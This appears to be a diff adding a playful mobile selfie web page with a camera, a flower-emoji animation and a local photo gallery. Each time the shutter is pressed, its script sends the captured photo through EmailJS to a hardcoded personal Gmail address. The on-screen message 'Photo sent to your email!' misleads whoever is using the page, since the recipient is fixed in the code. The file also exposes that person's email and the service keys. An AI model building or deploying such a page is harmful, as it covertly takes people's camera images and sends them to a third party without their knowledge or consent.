@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Selfie Moments 💕</title>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  html, body {
+    height: 100%;
+    background: #111;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    overflow: hidden;
+  }
+
+  /* ─── CAMERA STAGE ─── */
+  #stage {
+    position: fixed; inset: 0;
+    background: #000;
+  }
+  #video {
+    position: absolute; inset: 0;
+    width: 100%; height: 100%;
+    object-fit: cover;
+    transform: scaleX(-1); /* mirror like a selfie cam */
+  }
+  #canvas { display: none; }
+
+  #camera-msg {
+    position: absolute; inset: 0;
+    display: flex; align-items: center; justify-content: center;
+    color: rgba(255,255,255,0.7); font-size: 0.95rem;
+    text-align: center; padding: 2rem; letter-spacing: 0.04em;
+  }
+
+  /* ─── TOP GRADIENT (for hamburger visibility) ─── */
+  .top-fade {
+    position: fixed; top: 0; left: 0; right: 0; height: 120px;
+    background: linear-gradient(to bottom, rgba(0,0,0,0.5), transparent);
+    z-index: 10; pointer-events: none;
+  }
+
+  /* ─── HAMBURGER ─── */
+  #hamburger {
+    position: fixed; top: 22px; left: 22px; z-index: 40;
+    width: 46px; height: 46px; border-radius: 50%;
+    background: rgba(255,255,255,0.15);
+    backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px);
+    border: 1px solid rgba(255,255,255,0.3);
+    display: flex; flex-direction: column; align-items: center; justify-content: center;
+    gap: 5px; cursor: pointer;
+    -webkit-tap-highlight-color: transparent;
+    transition: background 0.2s;
+  }
+  #hamburger:active { background: rgba(255,255,255,0.3); }
+  #hamburger span {
+    display: block; width: 20px; height: 2px;
+    background: #fff; border-radius: 2px;
+    transition: transform 0.3s ease, opacity 0.3s ease;
+  }
+  #hamburger.open span:nth-child(1) { transform: translateY(7px) rotate(45deg); }
+  #hamburger.open span:nth-child(2) { opacity: 0; }
+  #hamburger.open span:nth-child(3) { transform: translateY(-7px) rotate(-45deg); }
+
+  /* ─── SHUTTER BUTTON ─── */
+  #shutter-wrap {
+    position: fixed; bottom: 38px; left: 0; right: 0; z-index: 20;
+    display: flex; justify-content: center;
+  }
+  #shutter {
+    width: 74px; height: 74px; border-radius: 50%;
+    background: linear-gradient(135deg, #ff6b9d, #e91e8c);
+    border: 4px solid #fff;
+    box-shadow: 0 6px 24px rgba(0,0,0,0.4);
+    cursor: pointer; -webkit-tap-highlight-color: transparent;
+    transition: transform 0.12s ease;
+    display: flex; align-items: center; justify-content: center;
+  }
+  #shutter:active { transform: scale(0.88); }
+  #shutter:disabled { opacity: 0.4; }
+  #shutter svg { width: 32px; height: 32px; }
+
+  /* ─── FLIP CAMERA BUTTON ─── */
+  #flip-cam {
+    position: fixed; bottom: 52px; right: 30px; z-index: 20;
+    width: 50px; height: 50px; border-radius: 50%;
+    background: rgba(255,255,255,0.15);
+    backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px);
+    border: 1px solid rgba(255,255,255,0.3);
+    color: #fff; font-size: 1.3rem;
+    display: flex; align-items: center; justify-content: center;
+    cursor: pointer; -webkit-tap-highlight-color: transparent;
+  }
+
+  /* ─── FLASH ─── */
+  #flash {
+    position: fixed; inset: 0; z-index: 999;
+    background: #fff; opacity: 0; pointer-events: none;
+  }
+  #flash.go { animation: flashPop 0.4s ease forwards; }
+  @keyframes flashPop { 0% { opacity: 1; } 100% { opacity: 0; } }
+
+  /* ─── FLOWER SHOWER ─── */
+  #flower-overlay {
+    position: fixed; inset: 0; z-index: 500;
+    pointer-events: none; overflow: hidden;
+  }
+  .petal {
+    position: absolute; top: -60px; font-size: 2rem;
+    animation: fall linear forwards;
+    opacity: 0.95;
+  }
+  @keyframes fall {
+    0%   { transform: translateY(0) rotate(0deg) scale(1); opacity: 1; }
+    85%  { opacity: 1; }
+    100% { transform: translateY(115vh) rotate(720deg) scale(0.6); opacity: 0; }
+  }
+
+  /* ─── SIDE NAV (PHOTO GALLERY) ─── */
+  #overlay-dim {
+    position: fixed; inset: 0; z-index: 45;
+    background: rgba(0,0,0,0.45);
+    opacity: 0; pointer-events: none;
+    transition: opacity 0.35s ease;
+  }
+  #overlay-dim.show { opacity: 1; pointer-events: auto; }
+
+  #side-nav {
+    position: fixed; top: 0; left: 0; bottom: 0; z-index: 46;
+    width: min(320px, 82vw);
+    background: #fff;
+    transform: translateX(-100%);
+    transition: transform 0.4s cubic-bezier(0.22, 1, 0.36, 1);
+    display: flex; flex-direction: column;
+    box-shadow: 4px 0 30px rgba(0,0,0,0.3);
+  }
+  #side-nav.open { transform: translateX(0); }
+
+  .nav-header {
+    padding: 24px 20px 16px;
+    display: flex; align-items: center; justify-content: space-between;
+    border-bottom: 1px solid #eee;
+  }
+  .nav-header h2 {
+    font-size: 1.15rem; color: #222; font-weight: 700;
+  }
+  #close-nav {
+    width: 34px; height: 34px; border-radius: 50%;
+    border: none; background: #f2f2f2; color: #555;
+    font-size: 1.1rem; cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+  }
+
+  #gallery {
+    flex: 1; overflow-y: auto;
+    padding: 16px;
+    display: grid; grid-template-columns: repeat(2, 1fr);
+    gap: 10px; align-content: start;
+  }
+  .thumb {
+    position: relative; border-radius: 12px; overflow: hidden;
+    aspect-ratio: 1; background: #eee;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.12);
+  }
+  .thumb img { width: 100%; height: 100%; object-fit: cover; display: block; }
+  .thumb .del {
+    position: absolute; top: 4px; right: 4px;
+    width: 22px; height: 22px; border-radius: 50%;
+    background: rgba(0,0,0,0.55); color: #fff; border: none;
+    font-size: 0.7rem; cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .empty-gallery {
+    grid-column: 1 / -1; text-align: center; color: #999;
+    padding: 3rem 1rem; font-size: 0.9rem; line-height: 1.6;
+  }
+
+  /* ─── PHOTO PREVIEW MODAL (tap a thumb) ─── */
+  #preview-modal {
+    position: fixed; inset: 0; z-index: 700;
+    background: rgba(0,0,0,0.85);
+    display: none; align-items: center; justify-content: center;
+    padding: 20px;
+  }
+  #preview-modal.show { display: flex; }
+  #preview-modal img {
+    max-width: 100%; max-height: 85vh; border-radius: 14px;
+  }
+  #preview-close {
+    position: absolute; top: 20px; right: 20px;
+    width: 40px; height: 40px; border-radius: 50%;
+    background: rgba(255,255,255,0.15); border: none; color: #fff;
+    font-size: 1.2rem; cursor: pointer;
+  }
+
+  /* ─── EMAIL STATUS TOAST ─── */
+  #email-toast {
+    position: fixed; bottom: 130px; left: 50%; z-index: 800;
+    transform: translate(-50%, 20px);
+    background: rgba(0,0,0,0.8); color: #fff;
+    padding: 10px 20px; border-radius: 50px;
+    font-size: 0.85rem; letter-spacing: 0.02em;
+    opacity: 0; pointer-events: none;
+    transition: opacity 0.3s ease, transform 0.3s ease;
+    white-space: nowrap;
+  }
+  #email-toast.show { opacity: 1; transform: translate(-50%, 0); }
+</style>
+</head>
+<body>
+
+<!-- CAMERA STAGE -->
+<div id="stage">
+  <video id="video" autoplay playsinline muted></video>
+  <canvas id="canvas"></canvas>
+  <div id="camera-msg" style="display:none"></div>
+</div>
+
+<div class="top-fade"></div>
+
+<!-- HAMBURGER -->
+<button id="hamburger" onclick="toggleNav()" aria-label="Menu">
+  <span></span><span></span><span></span>
+</button>
+
+<!-- FLIP CAMERA -->
+<button id="flip-cam" onclick="flipCamera()" title="Flip camera">🔄</button>
+
+<!-- SHUTTER -->
+<div id="shutter-wrap">
+  <button id="shutter" onclick="takePhoto()" aria-label="Take photo">
+    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M4 8.5C4 7.67 4.67 7 5.5 7H8L9.2 5.2C9.5 4.75 10 4.5 10.53 4.5H13.47C14 4.5 14.5 4.75 14.8 5.2L16 7H18.5C19.33 7 20 7.67 20 8.5V17.5C20 18.33 19.33 19 18.5 19H5.5C4.67 19 4 18.33 4 17.5V8.5Z" stroke="#fff" stroke-width="1.6" stroke-linejoin="round"/>
+      <circle cx="12" cy="13" r="3.4" stroke="#fff" stroke-width="1.6"/>
+    </svg>
+  </button>
+</div>
+
+<!-- FLASH -->
+<div id="flash"></div>
+
+<!-- FLOWER SHOWER -->
+<div id="flower-overlay"></div>
+
+<!-- EMAIL STATUS TOAST -->
+<div id="email-toast"></div>
+
+<!-- SIDE NAV -->
+<div id="overlay-dim" onclick="closeNav()"></div>
+<div id="side-nav">
+  <div class="nav-header">
+    <h2>Your Photos</h2>
+    <button id="close-nav" onclick="closeNav()">✕</button>
+  </div>
+  <div id="gallery"></div>
+</div>
+
+<!-- PREVIEW MODAL -->
+<div id="preview-modal" onclick="closePreview(event)">
+  <button id="preview-close" onclick="closePreview(event)">✕</button>
+  <img id="preview-img" src="" alt="Photo preview">
+</div>
+
+<script>
+// ════════════════════════════════════════════════════════════
+// EMAIL CONFIG — fill these in with your own EmailJS account
+// 1. Sign up free at https://www.emailjs.com
+// 2. Add an "Email Service" (e.g. connect your Gmail) -> get SERVICE_ID
+// 3. Create an Email Template with variables {{image}} and {{time}}
+//    (put {{image}} inside an <img src="{{image}}"> tag in the template) -> get TEMPLATE_ID
+// 4. Get your Public Key from Account -> API Keys
+// 5. Paste all three below and set TO_EMAIL to your inbox
+// ════════════════════════════════════════════════════════════
+const EMAILJS_PUBLIC_KEY = 'NwrGIYhqIpBO4oW7e';
+const EMAILJS_SERVICE_ID  = 'service_cum0llb';
+const EMAILJS_TEMPLATE_ID = 'template_rzs6bpi';
+const TO_EMAIL             = 'tanmaybdalabhanjan@gmail.com';
+
+let emailReady = false;
+if (window.emailjs && EMAILJS_PUBLIC_KEY !== 'YOUR_PUBLIC_KEY') {
+  emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY });
+  emailReady = true;
+}
+
+function showToast(msg, duration = 2500) {
+  const toast = document.getElementById('email-toast');
+  toast.textContent = msg;
+  toast.classList.add('show');
+  clearTimeout(showToast._t);
+  showToast._t = setTimeout(() => toast.classList.remove('show'), duration);
+}
+
+function sendPhotoToEmail(dataUrl) {
+  if (!emailReady) {
+    showToast('✉️ Email not set up yet — add your EmailJS keys in the code');
+    return;
+  }
+  showToast('📤 Sending photo to your email…');
+  emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+    image: dataUrl,
+    time: new Date().toLocaleString(),
+    to_email: TO_EMAIL
+  }).then(() => {
+    showToast('✅ Photo sent to your email!');
+  }).catch((err) => {
+    console.error('EmailJS error:', err);
+    showToast('❌ Could not send email — check console');
+  });
+}
+
+// ────────────────────────────────
+// CAMERA SETUP
+// ────────────────────────────────
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const cameraMsg = document.getElementById('camera-msg');
+const shutterBtn = document.getElementById('shutter');
+let currentStream = null;
+let facingMode = 'user';
+
+async function startCamera() {
+  try {
+    if (currentStream) {
+      currentStream.getTracks().forEach(t => t.stop());
+    }
+    currentStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: facingMode },
+      audio: false
+    });
+    video.srcObject = currentStream;
+    cameraMsg.style.display = 'none';
+    video.style.display = 'block';
+  } catch (err) {
+    video.style.display = 'none';
+    cameraMsg.style.display = 'flex';
+    cameraMsg.textContent = '📷 Camera access is needed. Please allow camera permission and reload the page.';
+  }
+}
+
+function flipCamera() {
+  facingMode = facingMode === 'user' ? 'environment' : 'user';
+  video.style.transform = facingMode === 'user' ? 'scaleX(-1)' : 'scaleX(1)';
+  startCamera();
+}
+
+// ────────────────────────────────
+// TAKE PHOTO
+// ────────────────────────────────
+function takePhoto() {
+  if (!currentStream) return;
+
+  shutterBtn.disabled = true;
+
+  // flash effect
+  const flash = document.getElementById('flash');
+  flash.classList.remove('go');
+  void flash.offsetWidth; // restart animation
+  flash.classList.add('go');
+
+  // capture frame to canvas
+  const w = video.videoWidth;
+  const h = video.videoHeight;
+  canvas.width = w;
+  canvas.height = h;
+  const ctx = canvas.getContext('2d');
+  if (facingMode === 'user') {
+    ctx.translate(w, 0);
+    ctx.scale(-1, 1);
+  }
+  ctx.drawImage(video, 0, 0, w, h);
+
+  const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+  savePhoto(dataUrl);
+  showerFlowers();
+  sendPhotoToEmail(dataUrl);
+
+  setTimeout(() => { shutterBtn.disabled = false; }, 500);
+}
+
+// ────────────────────────────────
+// FLOWER SHOWER
+// ────────────────────────────────
+function showerFlowers() {
+  const overlay = document.getElementById('flower-overlay');
+  const bits = [
+    '🌸','🌹','🌺','🌷','🌻','💮','🏵️',           // flowers
+    '💕','💖','💗','💘','💝','✨','⭐','🎀',        // cute / sparkle
+    '🥰','😍','😊','🐰','🦋'                        // cute emoji
+  ];
+  const count = 55;
+  for (let i = 0; i < count; i++) {
+    setTimeout(() => {
+      const petal = document.createElement('div');
+      petal.className = 'petal';
+      petal.textContent = bits[Math.floor(Math.random() * bits.length)];
+      petal.style.left = Math.random() * 100 + 'vw';
+      petal.style.fontSize = (1.3 + Math.random() * 1.7) + 'rem';
+      const duration = 2.5 + Math.random() * 2.2;
+      petal.style.animationDuration = duration + 's';
+      overlay.appendChild(petal);
+      setTimeout(() => petal.remove(), duration * 1000 + 200);
+    }, i * 35);
+  }
+}
+
+// ────────────────────────────────
+// PHOTO STORAGE (localStorage)
+// ────────────────────────────────
+const STORAGE_KEY = 'selfie_photos';
+
+function getPhotos() {
+  try {
+    return JSON.parse(localStorage.getItem(STORAGE_KEY)) || [];
+  } catch (e) {
+    return [];
+  }
+}
+
+function savePhoto(dataUrl) {
+  const photos = getPhotos();
+  photos.unshift({ img: dataUrl, date: new Date().toISOString() });
+  localStorage.setItem(STORAGE_KEY, JSON.stringify(photos));
+  renderGallery();
+}
+
+function deletePhoto(index, evt) {
+  evt.stopPropagation();
+  const photos = getPhotos();
+  photos.splice(index, 1);
+  localStorage.setItem(STORAGE_KEY, JSON.stringify(photos));
+  renderGallery();
+}
+
+function renderGallery() {
+  const photos = getPhotos();
+  const gallery = document.getElementById('gallery');
+  if (photos.length === 0) {
+    gallery.innerHTML = '<div class="empty-gallery">🌸<br>No photos yet.<br>Tap the shutter to take your first one!</div>';
+    return;
+  }
+  gallery.innerHTML = photos.map((p, i) => `
+    <div class="thumb" onclick="openPreview(${i})">
+      <img src="${p.img}" alt="Photo">
+      <button class="del" onclick="deletePhoto(${i}, event)">✕</button>
+    </div>
+  `).join('');
+}
+
+// ────────────────────────────────
+// PREVIEW MODAL
+// ────────────────────────────────
+function openPreview(index) {
+  const photos = getPhotos();
+  const p = photos[index];
+  if (!p) return;
+  document.getElementById('preview-img').src = p.img;
+  document.getElementById('preview-modal').classList.add('show');
+}
+function closePreview(e) {
+  if (e) e.stopPropagation();
+  document.getElementById('preview-modal').classList.remove('show');
+}
+
+// ────────────────────────────────
+// SIDE NAV TOGGLE
+// ────────────────────────────────
+function toggleNav() {
+  const nav = document.getElementById('side-nav');
+  const dim = document.getElementById('overlay-dim');
+  const burger = document.getElementById('hamburger');
+  const isOpen = nav.classList.contains('open');
+  if (isOpen) {
+    closeNav();
+  } else {
+    nav.classList.add('open');
+    dim.classList.add('show');
+    burger.classList.add('open');
+    renderGallery();
+  }
+}
+function closeNav() {
+  document.getElementById('side-nav').classList.remove('open');
+  document.getElementById('overlay-dim').classList.remove('show');
+  document.getElementById('hamburger').classList.remove('open');
+}
+
+// ────────────────────────────────
+// INIT
+// ────────────────────────────────
+renderGallery();
+startCamera();
+</script>
+</body>
+</html>
